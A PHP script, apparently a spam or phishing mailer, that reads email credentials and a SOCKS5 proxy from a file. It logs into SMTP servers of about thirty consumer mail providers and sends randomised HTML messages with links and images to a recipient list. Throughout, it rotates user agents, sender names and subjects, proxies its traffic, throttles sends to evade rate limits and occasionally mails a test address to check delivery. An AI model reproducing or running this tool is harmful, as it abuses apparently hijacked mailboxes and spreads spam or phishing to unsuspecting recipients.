<?php


function clean($uncleaned) {
	$uncleaned=preg_replace('/^\h*\v+/m', '', $uncleaned);
	$uncleaned=preg_replace('/^[ \t]+|[ \t]+$/m', '', $uncleaned);
	$uncleaned=preg_replace('/\A[ \t]*\r?\n|\r?\n[ \t]*\Z/m', '', $uncleaned);
	$uncleaned=ltrim($uncleaned);
	$uncleaned=rtrim($uncleaned);
	$uncleaned=preg_replace('/\s{2,}/', ' ', $uncleaned);
	return($uncleaned);}
/////
function generate($length1) {
    $include_chars1 = "abcdefghijklmnopqrstuvwxyz";
    $charLength1 = strlen($include_chars1);
    $randomString1 = '';
    for ($i1 = 0; $i1 < $length1; $i1++) {
        $randomString1 .= $include_chars1 [rand(0, $charLength1 - 1)];
    }
    return $randomString1;}
/////
function read_cb($ch, $fp, $length) {
    return fread($fp, $length);
}
////////////

$date=date("d.m.Y");
$dir=dirname(__FILE__);
$testacc="korijakekc@comcast.net";


$data=file(''.$dir.'/account.txt');

preg_match_all('/([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,9})/', $data[0], $out);
$username=clean($out[0][0]);

$password=preg_replace('/ - .*/', '', $data[0]);
$password=preg_replace('/([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,9})\W/', '', $password);
$password=clean($password);


$ipport=preg_replace('/.*@/', '', $data[0]);
$ipport=clean($ipport);

$logpass=preg_replace('/.* - /', '', $data[0]);
$logpass=preg_replace('/@.*/', '', $logpass);
$logpass=clean($logpass);
unset($data);

$useragent=file(''.$dir.'/email/useragents.txt');
$agent=$useragent[mt_rand(0, count($useragent)-1)];
$agent=clean($agent);


///
if(preg_match('/@web\.de/i', $username))
{
	$url="smtp://smtp.web.de:587/";
}
elseif(preg_match('/@gmx\.de/i', $username) || preg_match('/@gmx\.net/i', $username) || preg_match('/@gmx\.at/i', $username) || preg_match('/@gmx\.ch/i', $username))
{
	$url="smtp://mail.gmx.net:587/";
}
elseif(preg_match('/@t-online\./i', $username))
{
	$url="smtp://securesmtp.t-online.de:587/";
}
elseif(preg_match('/@freenet\.de/i', $username))
{
	$url="smtp://mx.freenet.de:587/";
}
elseif(preg_match('/@arcor\.de/i', $username) || preg_match('/@nexgo\.de/i', $username))
{
	$url="smtp://mail.arcor.de:587/";
}
elseif(preg_match('/@orange\./i', $username))
{
	$url="smtp://smtp.premium.orange.fr:587/";
}
elseif(preg_match('/@wanadoo\./i', $username))
{
	$url="smtp://smtp.orange.fr:587/";
}
elseif(preg_match('/@sfr\.fr/i', $username))
{
	$url="smtp://smtp.sfr.fr:587/";
}
elseif(preg_match('/@'.preg_quote('free.fr').'/i', $username))
{
$url="smtp://smtp.free.fr:587/";
}
elseif(preg_match('/@'.preg_quote('neuf.fr').'/i', $username))
{
	$url="smtp://smtp.neuf.fr:587/";
}
elseif(preg_match('/@talktalk\./i', $username))
{
	$url="smtp://smtp.talktalk.net:587/";
}
elseif(preg_match('/@comcast\./i', $username))
{
	$url="smtp://smtp.comcast.net:587/";
}
elseif(preg_match('/@earthlink\./i', $username) || preg_match('/@mindspring\./i', $username))
{
	$url="smtp://smtpauth.earthlink.net:587/";
}
elseif(preg_match('/@mail\.com/i', $username) || preg_match('/@usa\.com/i', $username))
{
	$url="smtp://smtp.mail.com:587/";
}
elseif(preg_match('/@terra\.com\.br/i', $username))
{
	$url="smtp://smtp.terra.com.br:587/";
}
elseif(preg_match('/@'.preg_quote('mchsi.com').'/i', $username))
{
	$url="smtp://smtp.mchsi.com:587/";	
}
elseif(preg_match('/@aol\./i', $username))
{
	$url="smtp://smtp.aol.com:587/";
}
elseif(preg_match('/@peoplepc\./i', $username))
{
	$url="smtp://smtpauth.peoplepc.com:587/";
}
elseif(preg_match('/@'.preg_quote('onetel.net').'/i', $username))
{
	$url="smtp://smtp.onetel.net:587/";
}
elseif(preg_match('/@freemail\.hu/i', $username))
{
	$url="smtp://smtp.freemail.hu:587/";
}
elseif(preg_match('/@cogeco\.ca/i', $username) || preg_match('/@cgocable\.ca/i', $username))
{
	$url="smtp://smtp.cogeco.ca:587/";
}
elseif(preg_match('/@laposte\.net/i', $username))
{
	$url="smtp://smtp.laposte.net:587/";
}
elseif(preg_match('/@wp\.pl/i', $username))
{
	$url="smtp://smtp.wp.pl:587/";
}
elseif(preg_match('/@o2\.pl/i', $username) || preg_match('/@tlen\.pl/i', $username))
{
	$url="smtp://poczta.o2.pl:587/";
}
elseif(preg_match('/@onet\.pl/i', $username))
{
	$url="smtp://smtp.poczta.onet.pl:587/";
}
elseif(preg_match('/@onetel\.com/i', $username) || preg_match('/@onetel\.net/i', $username))
{
	$url="smtp://smtp.onetel.com:587/";
}
elseif(preg_match('/@gazeta\.pl/i', $username))
{
	$url="smtp://smtp.gazeta.pl:587/";
}
elseif(preg_match('/@bigpond\.com/i', $username))
{
	$url="smtp://smtp.telstra.com:587/";
}
elseif(preg_match('/@gmx\.com/i', $username))
{
	$url="smtp://mail.gmx.com:587/";
}
elseif(preg_match('/@sina\.com/i', $username))
{
	$url="smtp://smtp.sina.com:587/";
}	


else
{
	exit;
}
///


	
////	
$data=file(''.$dir.'/data.txt');
$cnt=count($data);
unset($data);

$testnum=mt_rand(1, $cnt-1);
//$testnum1=mt_rand(1, 400);


/////////////
$ch = curl_init();

for($i=0;$i<$cnt;$i++)
{
	
	$data=file(''.$dir.'/data.txt');
	$to=clean($data[0]);
	
	if($i===$testnum)
	{
		if($i % 5 === 0)
		{
			$to=$testacc;
		}
	}

	
	for($y=1;$y<=45;$y++) { $rand[$y]=generate(mt_rand(mt_rand(7, 9), mt_rand(10, 12))); }

	
	$m1=file(''.$dir.'/email/links1.txt');
	$link1=$m1[mt_rand(0, count($m1)-1)];
	$link1=clean($link1);

	$m2=file(''.$dir.'/email/links2.txt');
	$link2=$m2[mt_rand(0, count($m2)-1)];
	$link2=clean($link2);
	
	$m3=file(''.$dir.'/email/links3.txt');
	$link3=$m3[mt_rand(0, count($m3)-1)];
	$link3=clean($link3);
	
	$m4=file(''.$dir.'/email/m1.txt');
	$name1=$m4[mt_rand(0, count($m4)-1)];
	$name1=clean($name1);
	
	$m5=file(''.$dir.'/email/m2.txt');
	$name2=$m5[mt_rand(0, count($m5)-1)];
	$name2=clean($name2);
	
	$m6=file(''.$dir.'/email/w1.txt');
	$name3=$m6[mt_rand(0, count($m6)-1)];
	$name3=clean($name3);

	$m7=file(''.$dir.'/email/w2.txt');
	$name4=$m7[mt_rand(0, count($m7)-1)];
	$name4=clean($name4);
	
	$m8=file(''.$dir.'/email/img1.txt');
	$img1=$m8[mt_rand(0, count($m8)-1)];
	$img1=clean($img1);

	$m9=file(''.$dir.'/email/img2.txt');
	$img2=$m9[mt_rand(0, count($m9)-1)];
	$img2=clean($img2);
	
	$m10=file(''.$dir.'/email/froms.txt');
	$fromname=$m10[mt_rand(0, count($m10)-1)];
	$fromname=clean($fromname);
	
	$m11=file(''.$dir.'/email/subjects.txt');
	$subject=$m11[mt_rand(0, count($m11)-1)];
	$subject=clean($subject);
	
	$m12=file(''.$dir.'/email/froms.txt');
	$text=$m12[mt_rand(0, count($m12)-1)];
	$text=clean($text);


	if($i % 2 === 0) { $fromname=''.$name1.' '.$name2.''; } else { $fromname=''.$name3.' '.$name4.''; }
	
	//$subject=''.ucwords($rand[20]).' '.$rand[21].' '.$rand[22].' '.$rand[23].' '.$rand[24].' '.$rand[25].'';
	//$fromname=''.ucwords($rand[17]).' '.$rand[18].' '.$rand[19].'';


$body='<html style="width: 100%;"><head><meta name="GENERATOR" content="MSHTML '.mt_rand(11, 15).'.00.'.mt_rand(9600, 9700).'.'.mt_rand(19001, 19999).';width=device-width; initial-scale=1.0; maximum-scale=1.0;"></head>
<body>
<table border="0" align="center" cellpadding="0" cellspacing="0"><tbody>
<tr>
<td colspan="'.mt_rand(1, 3).'" align="center" valign="top">
<center><a href="'.$link1.'"><font face="Verdana, Arial, Helvetica, sans-serif" size="3">'.$text.'</font></a></center>
</td>
</tr>
<tr>
<td colspan="'.mt_rand(1, 3).'" align="center" valign="top"><br>
<center><a href="'.$link1.'"><img src="'.$img1.'" border="0" alt=""></a></center>
</td>
</tr>
<tr>
<td colspan="'.mt_rand(1, 3).'" align="center" valign="top"><br>
<center><a href="'.$link3.'"><img src="'.$img2.'" border="0" alt=""></a></center>
</td>
</tr>
</tbody>
</table>
</body>
</html>';
	
	
	
	///////////////
	$fp = fopen('php://memory', 'r+');
	$string = "From: ".$fromname."<".$username.">\r\n";
	$string .= "To: <".$to.">\r\n";
	$string .= "Date: ".date("r")."\r\n";
	$string .= "Subject: ".$subject."\r\n";
	$string .= "MIME-Version: 1.0\r\n";
	$string .= "Content-Type: text/html; charset=UTF-8\r\n";
	//$string .= "Content-Transfer-Encoding: 7bit\r\n";
	$string .= "\r\n";
	$string .= $body;
	$string .= "";
	fwrite($fp, $string);
	rewind($fp);
	
	
	if(preg_match('/@juno\./i', $username) || preg_match('/@netzero\./i', $username) || preg_match('/@orange\./i', $username) || preg_match('/@wanadoo\./i', $username))
	{
		
		curl_setopt_array($ch, [
		CURLOPT_PROXYTYPE => CURLPROXY_SOCKS5,
		CURLOPT_PROXY => ''.$ipport.'',
		CURLOPT_PROXYUSERPWD => ''.$logpass.'',
		CURLOPT_CONNECTTIMEOUT => '30',
		CURLOPT_URL => $url,
		CURLOPT_MAIL_FROM => '<'.$username.'>',
		CURLOPT_MAIL_RCPT => ['<'.$to.'>'],
		CURLOPT_USERNAME => ''.$username.'',
		CURLOPT_PASSWORD => ''.$password.'',
		//CURLOPT_USE_SSL => CURLUSESSL_ALL,
		CURLOPT_READFUNCTION => 'read_cb',
		CURLOPT_INFILE => $fp,
		CURLOPT_UPLOAD => TRUE,
		//CURLOPT_VERBOSE => TRUE,
		//CURLOPT_TIMEOUT => '30',
		CURLOPT_RETURNTRANSFER => TRUE
	]);
	
	}
	
	else
	{
		
		curl_setopt_array($ch, [
		CURLOPT_PROXYTYPE => CURLPROXY_SOCKS5,
		CURLOPT_PROXY => ''.$ipport.'',
		CURLOPT_PROXYUSERPWD => ''.$logpass.'',
		CURLOPT_CONNECTTIMEOUT => '30',
		CURLOPT_URL => $url,
		CURLOPT_MAIL_FROM => '<'.$username.'>',
		CURLOPT_MAIL_RCPT => ['<'.$to.'>'],
		CURLOPT_USERNAME => ''.$username.'',
		CURLOPT_PASSWORD => ''.$password.'',
		CURLOPT_USE_SSL => CURLUSESSL_ALL,
		CURLOPT_READFUNCTION => 'read_cb',
		CURLOPT_INFILE => $fp,
		CURLOPT_UPLOAD => TRUE,
		//CURLOPT_VERBOSE => TRUE,
		//CURLOPT_TIMEOUT => '30',
		CURLOPT_RETURNTRANSFER => TRUE
	]);
	
	}
	
	$result=curl_exec($ch);
	$info=curl_getinfo($ch);
	fclose($fp);
	
	if ($result===FALSE) 
	{
		$errornum=curl_errno($ch);
		
		file_put_contents(''.$dir.'/error.txt', ''.$errornum.': '.curl_strerror($errornum).': '.$info["http_code"].'' . PHP_EOL,FILE_APPEND);
		
		if(preg_match('/28/', $errornum))
		{
			touch(''.$dir.'/badproxy.txt');
			break;
		}
		
		if(preg_match('/550/', $info["http_code"]) || preg_match('/535/', $info["http_code"]))
		{
			touch(''.$dir.'/break.txt');
			break;
		}
		
	}
	else
	{
		if($i!==$testnum)
		{
			$data[0]=preg_replace('/.*/', '', clean($data[0]));
			file_put_contents(''.$dir.'/data.txt', $data);
		}
	}
	
	
unset($data);
$sleep=mt_rand(220, 260);
sleep($sleep);
}

curl_close($ch);

if(file_exists(''.$dir.'/break.txt')==FALSE)
{
touch(''.$dir.'/finish.txt');
}

///////////////////////////	
$vars = array_keys(get_defined_vars());
foreach($vars as $var) {
unset($$var); }

exit;